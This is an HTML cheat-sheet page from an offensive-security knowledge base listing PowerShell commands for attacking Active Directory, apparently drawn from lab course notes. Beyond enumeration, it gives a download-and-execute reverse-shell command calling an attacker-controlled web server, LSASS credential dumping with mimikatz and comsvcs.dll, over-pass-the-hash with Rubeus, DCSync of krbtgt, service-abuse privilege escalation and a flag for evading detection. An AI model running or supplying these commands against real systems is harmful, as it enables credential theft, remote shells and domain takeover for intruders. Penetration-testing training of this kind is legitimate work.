<!DOCTYPE html>
<html lang="en-US">

<head>
  <title>offsecvault - Knowledge Base</title>
  <!--------------------->
  <!-- b0ydC owned. -->
  <!-- --------------- -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8" />

  <style>
    body {
      font-size: 12px;
      font-family: ubuntu mono;
      background-color: white;
      color: black;
      margin: 0;
    }

    a {
      color: black;
      font-weight: bold;
      text-decoration: none;
    }

    a:hover,
    a:active {
      color: #868686;
      text-decoration: underline;
    }
    table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
    }

    table.center {
    margin-left: auto; 
    margin-right: auto;
}
    
  </style>
</head>

<body>
  <pre><center>
<a href="/index.html" style="text-decoration:none;">
 ▒█████    █████▒ █████▒ ██████ ▓█████  ▄████▄ ██▒   █▓ ▄▄▄       █    ██  ██▓  ▄▄▄█████▓
▒██▒  ██▒▓██   ▒▓██   ▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█▓██░   █▒▒████▄     ██  ▓██▒▓██▒  ▓  ██▒ ▓▒
▒██░  ██▒▒████ ░▒████ ░░ ▓██▄   ▒███   ▒▓█    ▄▓██  █▒░▒██  ▀█▄  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░
▒██   ██░░▓█▒  ░░▓█▒  ░  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██ █░░░██▄▄▄▄██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ 
░ ████▓▒░░▒█░   ░▒█░   ▒██████▒▒░▒████▒▒ ▓███▀ ░ ▒▀█░   ▓█   ▓██▒▒▒█████▓ ░██████▒▒██▒ ░ 
░ ▒░▒░▒░  ▒ ░    ▒ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░ ░ ▐░   ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   
  ░ ▒ ▒░  ░      ░     ░ ░▒  ░ ░ ░ ░  ░  ░  ▒    ░ ░░    ▒   ▒▒ ░░░▒░ ░ ░ ░ ░ ▒  ░  ░    
░ ░ ░ ▒   ░ ░    ░ ░   ░  ░  ░     ░   ░           ░░    ░   ▒    ░░░ ░ ░   ░ ░   ░      
    ░ ░                      ░     ░  ░░ ░          ░        ░  ░   ░         ░  ░       
                                       ░           ░                                     
</a></pre>

<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
    <a href="../../RED-TEAM.html">OFFENSIVE</a> |
    <a href="../../BLUE-TEAM.html">DEFENSIVE</a> |
    <a href="../../CTF.html">CTF</a> |
    <a href="../../TOOLS.html">TOOLS</a> |
    <a href="../../ABOUT.html">ABOUT</a> 
</div>
<pre style="text-align:center;">
<h3> Domain Enumeration | Powershell </h3>

using two tools [PowerView / ADModule]

<b>- active directory powershell module</b> 

<a href="https://github.com/samratashok/ADModule">ADModule | domain enumeration</a> 

<b>- bloodhound</b>

<a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> 

<b>-powerview</b>

<a href="https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>

<b>-sharpview</b>

<a href="https://github.com/tevora-threat/SharpView/">SharpView</a>

<b>::: get current domain</b>

PS> Get-Domain | (powerview)
PS> Get-ADDomain | (active directory module)

<b>::: get object of another domain </b>

PS> Get-Domain -Domain <domain>

PS> Get-ADDomain -Identity <domain>

<b>::: get domain SID for the current domain</b>

PS> Get-DomainSID 

PS> (Get-ADDomain).DomainSID 

<b>::: get domain policy for current domain</b>

PS> Get-DomainPolicyData 
PS> Get-DomainPolicy

PS> (Get-DomainPolicyData).systemaccess 

<b>::: get domain policy for another domain</b>

PS> (Get-DomainPolicyData –domain <domain>).systemaccess

<b>::: get domain controller for the current domain</b>

PS> Get-DomainController

PS> Get-ADDomainController

<b>::: get domain controller for another domain</b>

PS> Get-DomainController -Domain <domainName>

PS> Get-ADDomainController -DomainName <domainName> -Discover

<b>::: get list of user in current domain</b>

PS> Get-DomainUser
PS> Get-DomainUser -Identity <user>

PS> Get-ADUser -Filter * -Properties *
PS> Get-ADUser -Identity <userName> -Properties *

<b>::: get list of users by name and its count</b>

PS> Get-DomainUser | select samaccountname | measure

<b>::: get list of properties of a user in current domain</b>

PS> Get-DomainUser -Identity <user> -Properties *
PS> Get-DomainUser -Properties samaccountname,logonCount | will help to retrieve and understand the normal activity of users 

PS> Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
PS> Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}

<b>::: search for a string in a user's attribute</b>

PS> Get-DomainUser -LDAPFilter "Description=*STRING*" | select name,Description

PS> Get-ADUser -Filter 'Description -like "*STRING*"' -Properties Description | select name,Description

<b>::: get a list of computers in the current domain</b>

PS> Get-DomainComputer | select Name
PS> Get-DomainComputer -OperatingSystem "*Server 2016*"
PS> Get-DomainComputer -Ping

PS> Get-ADComputer -Filter * | select Name
PS> Get-ADComputer -Filter * -Properties *
PS> Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
PS> Get-ADComputer -Filter * -Properties DNSHostname | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}

<b>::: get all groups in the current domain</b>

PS> Get-DomainGroup | select Name
PS> Get-DomainGroup -Domain <target_domain>

PS> Get-ADGroup -Filter * | select Name
PS> Get-ADGroup -Filter * -Properties *

<b>::: get all groups containing the word "admin" in group name</b>

PS> Get-DomainGroup *admin*

PS> Get-ADGroup -Filter 'Name -like "*admin*"' | select Name

<b>::: get all members of the domain admin group</b>

PS> Get-DomainGroupMember -Identity "Domain Admins" -Recurse

PS> Get-ADGroupMember -Identity "Domain Admins" -Recursive

<b>::: get the group membership for a user</b>

PS> Get-DomainGroup -UserName "<userName>"

PS> Get-ADPrincipalGroupMembership -Identity <userName>

<b>::: list all local groups on a machine (need admin rights on non-dc machines)</b>

PS> Get-NetLocalGroup -ComputerName <hostname> -ListGroups

<b>::: get members of all the local groups on a machine (need admin rights on non-dc machines)</b>

PS> Get-NetLocalGroup -ComputerName <hostname> -Recurse

<b>::: get members of all the local group "Administrators" on a machine (need admin rights on non-dc machines)</b>

PS> Get-NetLocalGroupMember -ComputerName <hostname> -GroupName Administrators

<b>::: get actively logged users on a computer (need local admin rights on the target)</b>

PS> Get-NetLoggedon -ComputerName <hostname>

<b>::: get locally logged users on a computer (need remote registry on the target - started by default on server OS)</b>

PS> Get-LoggedonLocal -ComputerName <hostname>

<b>::: get the last logged user on a computer (need admin righst and remote registry on the target)</b>

PS> Get-LastLoggedOn -ComputerName <hostname>

<b>::: find shares on hosts in current domain</b>

PS> Invoke-ShareFinder -Verbose

<b>::: find sensitive files on computers in the domain</b>

PS> Invoke-FileFinder -Verbose

<b>::: get all fileservers of the domain</b>

PS> Get-NetFileServer

<b>::: get kerberos policy</b>

PS> (Get-DomainPolicy).KerberosPolicy

<b>::: get domain admin_groups of forest</b>

PS> Get-DomainGroup *admin* -domain <forest/root> | select samaccountname

<b>-GPO-</b>

<b>::: get list of GPO in current domain</b>

PS> Get-DomainGPO
PS> Get-DomainGPO -ComputerIdentity <hostname>

<b>::: get GPO which use restricted groups or groups.xml for interesting users</b>

PS> Get-DomainGPOLocalGroup 

<b>::: get users which are in a local group of a machine using GPO</b>

PS> Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity <hostname>

<b>::: get machines where the given user is member of a specific group</b>

PS> Get-DomainGPOUserLocalGroupMapping -Identity <user> -Verbose

<b>-OU-</b>

<b>::: get OU in a domain</b>

PS> Get-DomainOU

PS> Get-ADOrganizationalUnit -Filter * -Properties *

<b>::: get GPO applied on an OU. read GPOname from gplink attribute from Get-NetOU</b>

PS> Get-DomainGPO -Identity "gplink/cn"

<b>sample: </b>

PS> Get-DomainGPO -Identity {00000000-0000-0000-0000-000000000000}

<b>::: get attribute of an OU</b>

PS> (Get-DomainOU -Identity <OU>).attribute

<b>sample:</b>

PS> (Get-DomainOU -Identity Servers).gplink

<b>::: filter name on results</b>

PS> Get-DomainOU | select -ExpandProperty name

<b>::: list all computers in a specific OU</b>

PS> (Get-DomainOU -Identity [OUName]).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name

<b>-ACL-</b>

<b>::: enumerate ACL for domain admin group</b>

in case another domain group is needed, just change it...

PS> Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs –Verbose

<b>::: get ACL associated with the specified object</b>

PS> Get-DomainObjectAcl -SamAccountName <username> -ResolveGUIDs

<b>::: get ACL associated with the specified prefix to be used for search</b>

PS> Get-DomainObjectAcl -SearchBase "STRING" -ResolveGUIDs -Verbose

<b>::: enumerate ACLs using ActiveDirectory Module</b> *** by ObjectDN

PS> (Get-Acl 'AD:\CN=Administrator,CN-Users,CD=dollarcorp,DC=moneycorp,DC=local').Access

<b>::: search for interesting ACEs</b>

PS> Find-InterestingDomainAcl -ResolveGUIDs

<b>::: get ACL associated with specified path</b>

PS> Get-PathAcl -Path "\\<domain>\sysvol"

<b>::: show current ACL for a specific user</b>

PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -eq "<username>"}

note: ?{$_. = means find everything

<b>-TRUSTS-</b>

Is a relationship between two domains or forests which allows users of one domain or forest to 
access resources in the other domain or forest. 
Trust can be automatic (parent-child, same forest etc.) or established (forest, external). 

TDO / Trusted Domain Objects (represent the trust relation in a domain)

<b>::: get list of all domain trusts for the current domain</b>

PS> Get-DomainTrust
PS> Get-DomainTrust -Domain <domain>

PS> Get-ADTrust
PS> Get-ADTrust -Identity <domain>

<b>::: list all trust current forest</b> AD Module

PS> Get-ADForest | %{Get-ADTrust -Filter *}

<b>::: list trust in current domain</b>

PS> Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

PS> Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'

<b>::: list external trust in current forest</b>

PS> Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

PS> (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}

<b>::: map trusts of a forest</b>

PS> Get-ForestTrust
PS> Get-ForestTrust -Forest <root/forest>

PS> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'

<b>::: map trusts of current domain</b>

PS> Get-ADTrust -Filter *

<b>::: map trusts of external trust</b>

PS> Get-ADTrust -Filter * -Server <xternalTrust>

<b>-FOREST-</b>

<b>::: get details about the current forest</b>

PS> Get-Forest
PS> Get-Forest -Forest <root/forest>

PS> Get-ADForest
PS> Get-ADForest - Identity <root/forest>

<b>::: get all domains in the current forest</b>

PS> Get-ForestDomain
PS> Get-ForestDomain -Forest <root/forest>

PS> (Get-ADForest).Domains

<b>::: get all global catalogs for the current forest</b>

PS> Get-ForestGlobalCatalog
PS> Get-ForestGlobalCatalog -Forest <root/forest>

PS> Get-ADForest | select -ExpandProperty GlobalCatalogs

<b>-USER HUNTING-</b>

<b>::: get list of computers</b>

PS> Get-NetComputer

<b>::: find machines on the current domain where the current user has local admin access</b>

PS> Find-LocalAdminAccess -Verbose

<b>::: check if a computer has local admin access or not</b>

PS> Get-NetComputer <computername> | Invoke-CheckLocalAdminAccess

<b>::: find computers where a domain admin (or specified user/group) has sessions</b>

PS> Find-DomainUserLocation -Verbose
PS> Find-DomainUserLocation -UserGroupIdentity "<GROUP>"

<b>::: find computers where a domain admin session is available and current user has admin access</b>

PS> Find-DomainUserLocation -CheckAccess

<b>::: find computers (file servers and distributed file servers) where a domain admin session is available.</b>

PS> Find-DomainUserLocation -Stealth

<b>-PRIVILEGE ESCALATION-</b>

Tools:

<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a> 

ways of escalation:

-Missing patches
–Automated deployment and AutoLogonpasswords in clear text
–AlwaysInstallElevated(Any user can run MSI as SYSTEM)
–Misconfigured Services
–DLL Hijacking and more
–NTLM Relaying a.k.a. Won't Fix

<b>-PRIVESC LOCAL-</b>

<b>::: get services filepath</b>

PS> Get-WmiObject -Class win32_service | select pathname

note: when checking for services path, it is really important to double check the entire path and if exist an unquoated service. 
a service path can be abused if is not unquoated.

<b>::: how to get security descriptors</b>

PS> sc.exe sdshow <servicename>
PS> sc.exe sdshow alg
PS> sc.exe sdshow snmptrap

<b> POWERUP USAGE</b>

<b>::: import the tool powerUp</b>

1. import invishell
2. . /path/to/file/PowerUp.ps1

<b>::: get services with unquoated paths and a space in their name</b>

PS> Get-ServiceUnquoated -Verbose

<b>::: get services where the current user can write to its binary path or change arguments to the binary</b>

PS> Get-ModifiableServiceFile -Verbose

<b>::: get the services whose configuration current user can modify</b>

PS> Get-ModifiableService -Verbose

<b>::: abuse of "Get-ModifiableService" and add our current domain user to the local "Administrators" group</b>

PS> Invoke-ServiceAbuse -Name '<serviceName>' -UserName '<domain\user>'

note: doing that will give you an user with local admin rights. to complete the abuse, after the configuration
is completed, logoff and logon once again.

<b>::: get computers where the user added has local administrative access</b>

<b>Find-PSRemotingLocalAdminAccess.ps1 Tool Usage</b>

powershell remoting...
** import inviShell and import the module [Find-PSRemotingLocalAdminAccess.ps1]

PS> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS> Find-PSRemotingLocalAdminAccess

note: in case exist any result, it means the user added has admin rights on the computer reflected.

<b>::: how to connect to the computer using "winrs" as the student user</b>

<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs">winrs</a> 

PS> winrs -r:<hostname> cmd
PS> whoami
PS> hostname

<b>::: how to connect to the computer using PowerShell Remoting</b>

PS> Enter-PSSession -ComputerName <dnshostname>

<b>::: create encoded reverse shell using "Invoke-PowerShellTcp.ps1"</b>

note: file "Invoke-PowerShellTcp.ps1" need to be available on a local web server.

PS> powershell.exe iex (iwr http://<ip_Addr>/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress <ip_Addr> -Port <port>

or

PS> powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<ip_addr>/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress <ip_Addr> -Port 443

<b>-BLOODHOUND-</b>

<a href="https://github.com/BloodHoundAD/BloodHound">bloodhound tool</a> 

<b>usage:</b>

import sharphound.ps1

. C:\path\to\file\sharphound.ps1

PS> Invoke-BloodHound -CollectionMethod All -Verbose

to avoid detections like ATA [-ExcludeDC]

PS> Invoke-BloodHound -CollectionMethod All -ExcludeDC

<b>-LATERAL MOVEMENT-</b>
powershell remoting

ONE-TO-ONE | ONE-TO-MANY

<b>::: store a session in a variable</b>

PS> $[variable_name] = New-PSSession -ComputerName [hostname]
PS> $b0ydC = New-PSSession -ComputerName ofsv-001

<b>::: one to one</b>

PSSession

- interactive
- runs in a new process (wsmprovhost)
- stateful

PS> New-PSSession
PS> Enter-PSSession

<b>::: one to many</b>

- non-interactive
- execute command pararelly

PS> Invoke-Command

**

<b>::: use to execute commands or scriptblock</b>

PS> Invoke-Command –Scriptblock{Get-Process} -ComputerName(Get-Content <list_of_servers>)

<b>::: use to execute script from file</b>

PS> Invoke-Command –FilePathC:\scripts\Get-PassHashes.ps1 -ComputerName(Get-Content <list_of_servers>)

<b>::: execute locally loaded function on the remote machines</b>

PS> Invoke-Command -ScriptBlock${function:Get-PassHashes} -ComputerName(Get-Content <list_of_servers>)

<b>::: execute "Stateful" commands using Invoke-Command</b>

PS> $Sess = New-PSSession –Computername <hostname> Invoke-Command –Session $Sess –ScriptBlock{$Proc=Get-Process} Invoke-Command –Session $Sess –ScriptBlock{$Proc.Name}

<b>-LATERAL MOVEMENT : MIMIKATZ | EXTRACTING CREDENTIALS FROM LSASS-</b>

<b>::: dump credentials on a local machine using mimikatz </b>

PS> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

<b>::: using safetykatz (minidump of lsass and PELoader to run mimikatz)</b>

PS> SafetyKatz.exe "sekurlsa::ekeys"

<b>::: dump credentials using sharpkatz (C# port of some of mimikatz functionality)</b>

PS> SharpKatz.exe --Command ekeys

<b>::: dump credentials using dumpert(direct system calls and API unhooking)</b>

PS> rundll32.exe C:\Dumpert\Outflank-Dumpert.dll, Dump

<b>::: dump using pypykatz (mimikatz functinality in python)</b>

PS> pypykatz.exe live lsa

<b>::: dump using comsvcs.dll</b>

PS> tasklist /FI "IMAGENAME eq lsass.exe"
PS> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full

<b>-LATERAL MOVEMENT : MIMIKATZ | OVER PASS THE HASH-</b>

<b>::: over pass the hash generate tokens from hashes or keys. | need elevation, run as admin </b>

- mimikatz

PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

- safetyKatz

PS> SafetyKatz.exe"sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe""exit"

<b>::: rubeus.exe Usage</b>

- NO elevation required

PS> rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt

- elevation required

PS> Rubeus.exe asktgt /user:Administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

<b>-LATERAL MOVEMENT : MIMIKATZ | DCSync-</b>

<b>::: use the DCSyncfeature for getting krbtgthash executed </b>

both require admin privileges

PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
PS> SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"

<b>-Offensive .NET - Tradecraft-</b>

like AMSI Trigger, exist Defender Check for Windows Defender.

<a href="https://github.com/matterpreter/DefenderCheck">Defender Check</a> 

<b> </b>

<b> </b>

<b> </b>

<b> </b>

<b> </b>

<b> </b>

</center>
</body>
</html>
